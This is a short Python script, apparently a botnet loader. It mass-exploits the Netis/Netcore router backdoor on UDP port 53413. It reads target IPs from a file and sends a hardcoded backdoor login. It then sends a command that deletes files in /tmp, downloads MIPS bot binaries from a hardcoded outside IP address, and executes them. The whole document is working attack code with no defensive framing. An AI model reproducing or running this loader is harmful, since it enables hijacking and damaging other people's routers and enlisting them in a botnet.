#! python !#
import threading, sys, time, random, socket, re, os, subprocess, base64

commandpayload = "AA\x00\x00AAAA cd /tmp; rm -rf *; wget http://128.199.222.37/bins/netbot.mpsl; chmod 777 *; ./turbo.mpsl netis.mpsl; wget http://128.199.222.37/bins/netbot.mips; chmod 777 *; ./netbot.mips netis.mips; \x00" # MIPSEL Binary
loginpayload = "AAAAAAAAnetcore\x00" #DONT CHANGE
ips = open(sys.argv[1], "r").readlines()

def run(cmd):
    subprocess.call(cmd, shell=True)

class netis(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				print "Attempting %s"%(self.ip)
				s.sendto(loginpayload, (self.ip, 53413))
				time.sleep(1.5)
				s.sendto(commandpayload, (self.ip, 53413))
				time.sleep(3)
			except Exception:
				pass

for ip in ips:
	try:
		n = netis(ip)
		n.start()
		time.sleep(0.01)
	except:
		pass
